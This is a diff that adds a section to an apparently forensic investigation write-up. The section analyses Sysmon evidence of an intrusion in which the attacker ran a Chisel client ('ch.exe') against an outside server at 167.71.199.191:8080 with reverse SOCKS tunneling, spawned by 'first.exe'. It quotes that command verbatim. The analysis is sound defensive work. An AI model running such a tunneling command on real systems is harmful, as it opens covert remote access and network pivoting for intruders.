@@ -408,6 +408,23 @@ The use of Chisel was significant because the attacker had already enumerated li
 
 Together, these activities were consistent with preparation for additional remote access and network movement.
 
+Sysmon process-creation evidence recorded the following command:
+
+```text
+"C:\Users\benimaru\Downloads\ch.exe" client 167.71.199.191:8080 R:socks
+```
+
+The client argument indicates that the compromised endpoint initiated the connection to the remote Chisel server. The R:socks parameter specifies reverse SOCKS functionality.
+
+The process was launched by:
+
+C:\Users\Public\Downloads\first.exe
+This parent-child relationship connected the tunnel to the previously identified attacker-controlled execution chain.
+
+![Chisel reverse SOCKS proxy execution](evidence/10-chisel-reverse-socks.png)
+
+*Figure 10 — Sysmon process evidence showing `ch.exe` launched with reverse SOCKS tunneling parameters. The process was spawned by `first.exe`, connecting the tunneling activity to the earlier post-compromise execution chain.*
+
 ### Remote Authentication Activity
 
 The investigation also identified remote authentication activity associated with the later stages of the intrusion.
